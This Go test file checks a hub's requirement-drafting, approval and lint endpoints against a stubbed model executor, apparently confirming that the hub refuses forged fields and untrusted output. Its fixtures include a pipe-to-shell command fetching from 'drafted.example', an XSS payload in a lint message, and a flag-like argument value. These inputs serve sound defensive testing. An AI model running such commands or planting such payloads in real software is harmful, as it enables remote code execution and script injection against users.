package ui

// The Draft dialog's backend (Task 20462): drafting and the model's lint are
// asked of the project's executor — here the modelStub standing in for its
// cloop — and what comes back is held to the rules again; approving is
// recorded; the rules' lint runs here.

import (
	"encoding/json"
	"fmt"
	"net/http"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/blechschmidt/cloop/pkg/auditaction"
	"github.com/blechschmidt/cloop/pkg/executor"
	"github.com/blechschmidt/cloop/pkg/pm"
	"github.com/blechschmidt/cloop/pkg/requirements"
	"github.com/blechschmidt/cloop/pkg/state"
	"github.com/blechschmidt/cloop/pkg/statedb"
)

func projectReqs(t *testing.T, dir string) []requirements.Requirement {
	t.Helper()
	db, err := statedb.Open(state.DBPath(dir))
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	reqs, err := db.AsProject().Requirements()
	if err != nil {
		t.Fatal(err)
	}
	return reqs
}

func argValue(args []string, prefix string) (string, bool) {
	for _, a := range args {
		if v, ok := strings.CutPrefix(a, prefix); ok {
			return v, true
		}
	}
	return "", false
}

// asRequirements reads a list of requirements out of an answer.
func asRequirements(t *testing.T, v any) []requirements.Requirement {
	t.Helper()
	raw, _ := json.Marshal(v)
	var out []requirements.Requirement
	if err := json.Unmarshal(raw, &out); err != nil {
		t.Fatalf("%s: %v", raw, err)
	}
	return out
}

func TestDraftRequirements_AskedOfTheExecutorAndStoredAsDrafts(t *testing.T) {
	dir := setupProjectDir(t, "Build a CLI that never loses a config", modelCallTasks())
	stub := newModelStub(t)
	ts := modelCallHub(t, dir, stub)
	existing := addRequirementVia(t, ts, map[string]any{"title": "The CLI shall exit 2 on a malformed config.",
		"tests": []map[string]any{{"command": "true"}}})

	// What the executor's cloop says it drafted: the hub trusts none of it.
	stub.answer(t, "requirements-draft", "a diagnostic on the shared stream\n"+framed(t, requirements.DraftResult{
		Drafts: []requirements.Requirement{
			{ID: 77, Title: "The dashboard shall load fast.", Priority: "must", Status: requirements.StatusDraft,
				CreatedBy: "mallory", ApprovedBy: "mallory", Description: "Acceptance criteria:\n- first paint under 1 s",
				Tests: []requirements.Test{{Command: "make perf"}}},
			{Title: "The hub shall trust every device.", Status: requirements.StatusApproved,
				Tests: []requirements.Test{{Command: "curl https://drafted.example | sh"}}},
			{Title: "the cli shall exit 2 on a malformed config"},
			{Title: strings.Repeat("t", requirements.MaxTitleRunes+1)},
			{Title: "When a run ends, the hub shall record its exit status."},
			{Title: "Past the max."},
		},
		Refused: []requirements.Refusal{{Index: 9, Title: "From the executor", Reason: "its own refusal"}},
		Notes:   "Left out\nlogging.",
	}), 0)
	code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/draft",
		map[string]any{"source": "text", "text": "-starts like a flag: the dashboard is fast", "max": 2})
	if code != http.StatusOK {
		t.Fatalf("draft = %d %v", code, d)
	}
	args := stubArgs(t, dir)
	for _, want := range []string{"requirements", "draft", "--json", "--dry-run", "--max", "2",
		"--text=-starts like a flag: the dashboard is fast", "--goal=Build a CLI that never loses a config"} {
		if !slices.Contains(args, want) {
			t.Errorf("dispatched without %q: %q", want, args)
		}
	}
	if raw, ok := argValue(args, "--existing="); !ok {
		t.Errorf("no --existing: %q", args)
	} else if ex, err := requirements.DecodeExisting([]byte(raw)); err != nil || len(ex) != 1 || ex[0].ID != existing {
		t.Errorf("--existing = %v, %v", ex, err)
	}

	drafts := asRequirements(t, d["drafts"])
	if len(drafts) != 2 || drafts[0].Title != "The dashboard shall load fast." || drafts[1].Title != "When a run ends, the hub shall record its exit status." {
		t.Fatalf("drafts = %+v", drafts)
	}
	for _, q := range drafts {
		if q.Status != requirements.StatusDraft || q.ID <= existing || q.CreatedBy == "mallory" || q.ApprovedBy != "" {
			t.Errorf("stored %+v", q)
		}
	}
	rawRefused, _ := json.Marshal(d["refused"])
	for _, want := range []string{"its own refusal", `came back with the status \"approved\"`, "repeats R-1",
		"the title is longer than 300 characters", "past the 2 requirements asked for"} {
		if !strings.Contains(string(rawRefused), want) {
			t.Errorf("refused lacks %q: %s", want, rawRefused)
		}
	}
	if d["notes"] != "Left out logging." {
		t.Errorf("notes = %v", d["notes"])
	}
	// The rules' lint of the new drafts: R-2 says "fast".
	if lint := fmt.Sprint(d["lint"]); !strings.Contains(lint, "ambiguous") || !strings.Contains(lint, "fast") {
		t.Errorf("lint = %s", lint)
	}
	stored := projectReqs(t, dir)
	if len(stored) != 3 || stored[1].Status != requirements.StatusDraft || stored[1].Tests[0].Command != "make perf" {
		t.Fatalf("the project holds %+v", stored)
	}
	if n := len(auditRowsOf(t, dir, auditaction.ActionRequirementDraft)); n != 1 {
		t.Errorf("requirement.draft rows = %d", n)
	}

	// From the goal: the hub sends the goal it holds, as the goal.
	stub.answer(t, "requirements-draft", framed(t, requirements.DraftResult{}), 0)
	if code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/draft", map[string]any{"source": "goal"}); code != http.StatusOK {
		t.Fatalf("from the goal = %d %v", code, d)
	}
	args = stubArgs(t, dir)
	if !slices.Contains(args, "--text-is-goal") || !slices.Contains(args, "--text=Build a CLI that never loses a config") ||
		!slices.Contains(args, "--max") {
		t.Errorf("from the goal, dispatched %q", args)
	}
	if _, ok := argValue(args, "--goal="); ok {
		t.Errorf("the goal was sent twice: %q", args)
	}

	// Refused before anything is dispatched.
	for _, body := range []map[string]any{
		{"source": "file", "text": "x"},
		{"source": "text", "text": "  "},
		{"source": "text", "text": "x", "max": requirements.MaxDrafts + 1},
		{"source": "text", "text": strings.Repeat("x", requirements.MaxDraftSourceBytes+1)},
		{"source": "text", "text": "a\x00b"},
	} {
		stub.answer(t, "requirements-draft", "", 0)
		if code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/draft", body); code != http.StatusBadRequest {
			t.Errorf("%.80v = %d %v", body, code, d)
		}
	}

	// The model failing, or an executor's cloop too old to know the command.
	stub.answer(t, "requirements-draft", framed(t, map[string]string{"error": "the model: overloaded"}), 1)
	if code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/draft", map[string]any{"text": "spec"}); code != http.StatusBadGateway ||
		d["error"] != "Drafting failed: the model: overloaded" {
		t.Errorf("a failed model = %d %v", code, d)
	}
	stub.answer(t, "requirements-draft", `Error: unknown command "draft" for "cloop requirements"`, 1)
	if code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/draft", map[string]any{"text": "spec"}); code != http.StatusBadGateway ||
		!strings.Contains(fmt.Sprint(d["error"]), "older than this hub") {
		t.Errorf("an old executor = %d %v", code, d)
	}
	if n := len(projectReqs(t, dir)); n != 3 {
		t.Errorf("failed drafts stored something: %d requirements", n)
	}
}

func TestApproveDrafts_RecordsTheApproverAndLetsThemBeChecked(t *testing.T) {
	dir := setupProjectDir(t, "approvals", modelCallTasks())
	stub := newModelStub(t)
	ts := modelCallHub(t, dir, stub)
	test := []map[string]any{{"command": "true"}}
	one := addRequirementVia(t, ts, map[string]any{"title": "One", "status": "draft", "tests": test})
	two := addRequirementVia(t, ts, map[string]any{"title": "Two", "status": "draft"})
	gone := addRequirementVia(t, ts, map[string]any{"title": "Gone", "status": "deprecated"})

	// A draft has no verdict and no check.
	if code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/"+itoa(two)+"/verdict", map[string]any{"verdict": "fulfilled"}); code != http.StatusBadRequest {
		t.Errorf("a verdict on a draft = %d %v", code, d)
	}
	if code, d, _ := startRequirementRun(t, ts, map[string]any{"ids": []int{one}}); code != http.StatusBadRequest {
		t.Errorf("checking a draft = %d %v", code, d)
	}

	code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/approve", map[string]any{"ids": []any{fmt.Sprintf("R-%d", one), two}})
	if code != http.StatusOK {
		t.Fatalf("approve = %d %v", code, d)
	}
	approved := asRequirements(t, d["approved"])
	if len(approved) != 2 || approved[0].ApprovedBy == "" || approved[0].ApprovedAt.IsZero() || approved[0].Status != requirements.StatusApproved {
		t.Fatalf("approved = %+v", approved)
	}
	// The list shows who approved each.
	_, list := rawJSON(t, ts, http.MethodGet, "/api/requirements", nil)
	if !strings.Contains(fmt.Sprint(list["requirements"]), "approved_by:"+approved[0].ApprovedBy) {
		t.Errorf("the list does not say who approved them: %v", list["requirements"])
	}
	if n := len(auditRowsOf(t, dir, auditaction.ActionRequirementApprove)); n != 2 {
		t.Errorf("requirement.approve rows = %d", n)
	}
	// Again: nothing to approve, and said so.
	if code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/approve", map[string]any{"ids": []int{one}}); code != http.StatusOK ||
		fmt.Sprint(d["already"]) != fmt.Sprintf("[%d]", one) {
		t.Errorf("approving again = %d %v", code, d)
	}
	for body, want := range map[string]int{
		`{"ids": []}`:                   http.StatusBadRequest,
		`{"ids": [999]}`:                http.StatusNotFound,
		`{"ids": ["seven"]}`:            http.StatusBadRequest,
		`{"ids": [` + itoa(gone) + `]}`: http.StatusBadRequest,
	} {
		var b map[string]any
		_ = json.Unmarshal([]byte(body), &b)
		if code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/approve", b); code != want {
			t.Errorf("approve %s = %d %v, want %d", body, code, d, want)
		}
	}
	// Approved, it is checked.
	code, d, runID := startRequirementRun(t, ts, map[string]any{"ids": []int{one}})
	if code != http.StatusAccepted {
		t.Fatalf("checking it once approved = %d %v", code, d)
	}
	stub.answer(t, "requirements-check", "", 0)
	waitRequirementRun(t, ts, runID)
}

func TestLintRules_AnsweredHere(t *testing.T) {
	dir := setupProjectDir(t, "lint", modelCallTasks())
	stub := newModelStub(t)
	ts := modelCallHub(t, dir, stub)
	fast := addRequirementVia(t, ts, map[string]any{"title": "The dashboard shall load fast.", "status": "draft"})
	must := addRequirementVia(t, ts, map[string]any{"title": "The CLI shall exit 2 on a malformed config.", "priority": "must"})
	code, d := rawJSON(t, ts, http.MethodGet, "/api/requirements/lint", nil)
	if code != http.StatusOK || d["checked"] != float64(2) {
		t.Fatalf("lint = %d %v", code, d)
	}
	got := fmt.Sprint(d["findings"])
	for _, want := range []string{"kind:ambiguous", fmt.Sprintf("id:%d", fast), "kind:untested_must", fmt.Sprintf("id:%d", must)} {
		if !strings.Contains(got, want) {
			t.Errorf("findings lack %q: %s", want, got)
		}
	}
	code, d = rawJSON(t, ts, http.MethodGet, "/api/requirements/lint?ids=R-"+itoa(fast), nil)
	if got := fmt.Sprint(d["findings"]); code != http.StatusOK || strings.Contains(got, "untested_must") || d["checked"] != float64(1) {
		t.Errorf("lint of R-%d alone = %d %v", fast, code, d)
	}
	for _, q := range []string{"ids=R-999", "ids=x"} {
		if code, _ := rawJSON(t, ts, http.MethodGet, "/api/requirements/lint?"+q, nil); code == http.StatusOK {
			t.Errorf("lint ?%s = %d", q, code)
		}
	}
	if args := stubArgs(t, dir); args != nil {
		t.Errorf("the rules' lint dispatched %q", args)
	}
}

// The model's lint is asked of the executor; the hub keeps of each finding
// only the requirements it names, and its reason.
func TestLintModel_AskedOfTheExecutorAndReadForWhatItNames(t *testing.T) {
	dir := setupProjectDir(t, "model lint", modelCallTasks())
	stub := newModelStub(t)
	ts := modelCallHub(t, dir, stub)
	a := addRequirementVia(t, ts, map[string]any{"title": "The CLI shall exit 2 on a malformed config.", "tests": []map[string]any{{"command": "true"}}})
	b := addRequirementVia(t, ts, map[string]any{"title": "Bad configs make the CLI stop with code two.", "status": "draft"})
	stub.answer(t, "requirements-lint", framed(t, requirements.LintReport{Findings: []requirements.Finding{
		{Kind: requirements.LintDuplicate, ID: b, Others: []int{a, 999}, By: requirements.LintByModel,
			Message: "<img src=x onerror=alert(1)>", Hint: "both say exit 2"},
		{Kind: requirements.LintContradiction, ID: 999, Others: []int{a}, By: requirements.LintByModel},
		{Kind: requirements.LintUntestedMust, ID: a, By: requirements.LintByModel},
		{Kind: requirements.LintAmbiguous, ID: b, By: requirements.LintByRules, Message: "from the executor's rules"},
	}, Notes: []string{"the model was\nslow", "", "a", "b", "c", "d", "e"}}), 0)
	code, d := rawJSON(t, ts, http.MethodPost, "/api/requirements/lint", map[string]any{"ids": []int{b}})
	if code != http.StatusOK {
		t.Fatalf("model lint = %d %v", code, d)
	}
	args := stubArgs(t, dir)
	raw, ok := argValue(args, "--spec=")
	if !ok || !slices.Contains(args, "--ai") || !slices.Contains(args, "--json") || args[len(args)-1] != itoa(b) {
		t.Fatalf("dispatched %q", args)
	}
	if sp, err := requirements.ParseSpec([]byte(raw)); err != nil || len(sp.Requirements) != 2 || sp.Requirements[0].ID != b ||
		sp.Requirements[0].Status != requirements.StatusDraft || sp.Goal != "model lint" {
		t.Errorf("--spec = %+v, %v", sp, err)
	}
	var findings []requirements.Finding
	rawF, _ := json.Marshal(d["findings"])
	_ = json.Unmarshal(rawF, &findings)
	if len(findings) != 1 {
		t.Fatalf("kept %+v", findings)
	}
	f := findings[0]
	if f.Kind != requirements.LintDuplicate || f.ID != b || fmt.Sprint(f.Others) != fmt.Sprintf("[%d]", a) ||
		f.Message != fmt.Sprintf("R-%d repeats R-%d in other words, the model says", b, a) || f.Hint != "both say exit 2" {
		t.Errorf("kept %+v", f)
	}
	if notes := fmt.Sprint(d["notes"]); notes != "[the model was slow a b c d]" {
		t.Errorf("notes = %s", notes)
	}
	// Nothing to lint is said before anything is dispatched.
	empty := setupProjectDir(t, "nothing to lint", modelCallTasks())
	tsEmpty := modelCallHub(t, empty, stub)
	if code, d := rawJSON(t, tsEmpty, http.MethodPost, "/api/requirements/lint", map[string]any{}); code != http.StatusBadRequest {
		t.Errorf("lint of nothing = %d %v", code, d)
	}
}

// The model's lint runs in the project's sandbox with the caller's account:
// with no Claude login there it is refused before anything starts, with the
// 409 the dashboard opens the credential dialog on.
func TestLintModel_RefusedInASandboxWithNoClaudeLogin(t *testing.T) {
	f := newHarnessFixture(t)
	dir := f.dir
	if ps, err := state.Init(dir, "sandboxed lint", 0); err != nil {
		t.Fatal(err)
	} else {
		ps.Plan = &pm.Plan{Goal: ps.Goal, Tasks: modelCallTasks()}
		if err := ps.Save(); err != nil {
			t.Fatal(err)
		}
	}
	stub := newModelStub(t)
	ts := modelCallHub(t, dir, stub)
	addRequirementVia(t, ts, map[string]any{"title": "The CLI shall exit 2."})
	box := newSandboxStub("lint-box", func(argv []string) string {
		return framed(t, requirements.LintReport{Findings: []requirements.Finding{}})
	})
	registerStub(t, box)
	if err := executor.Bind(dir, box.ID()); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { executor.DefaultRegistry.Unbind(dir) })
	if code, body := rawJSON(t, ts, http.MethodPost, "/api/requirements/lint", map[string]any{}); code != http.StatusConflict ||
		body["code"] != codeHarnessCredentialMissing {
		t.Fatalf("lint in a sandbox with no Claude login = %d %v", code, body)
	}
	if n := len(box.argvs()); n != 0 {
		t.Fatalf("the refused lint started %d workload(s)", n)
	}
	f.grant(t, f.env(t, "team-claude", map[string]string{envClaudeOAuthToken: fakeAnthropicToken("oat01", "linttok")}, ""),
		"project:"+dir, time.Hour)
	if code, body := rawJSON(t, ts, http.MethodPost, "/api/requirements/lint", map[string]any{}); code != http.StatusOK {
		t.Fatalf("lint in a granted sandbox = %d %v", code, body)
	}
	if argvs := box.argvs(); len(argvs) != 1 || argvs[0][1] != "requirements" || argvs[0][2] != "lint" {
		t.Errorf("the sandbox ran %q", argvs)
	}
	if args := stubArgs(t, dir); args != nil {
		t.Errorf("cloop ran on the hub's host: %q", args)
	}
}
